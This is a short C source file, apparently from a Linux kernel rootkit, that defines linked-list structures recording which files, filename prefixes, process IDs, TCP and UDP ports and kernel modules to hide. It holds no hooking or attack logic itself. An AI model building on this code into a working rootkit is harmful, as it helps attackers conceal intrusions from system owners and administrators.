/*
 * This file manages the data structures used for determining
 * which files, processes, modules, sockets, ... need to be hidden.
 */
#include "include.h"

// list for hidden files

struct file_names{
	char name[1024];
	struct list_head file_list;
};

struct fname_prefix{
	char name[32];
	struct list_head fname_list;
	};

//list for hidden processes
struct processes{
	pid_t pid;
	struct list_head process_list;
	};

//list for hidden tcp sockets 
struct tcp_socket{
	int port;
	struct list_head tcp_list;
	};

//list for hidden udp sockets 
struct udp_socket{
	int port;
	struct list_head udp_list;
	};

//list for hidden module
struct modules{
	char name[32];
	struct list_head module_list;
	}; 

	




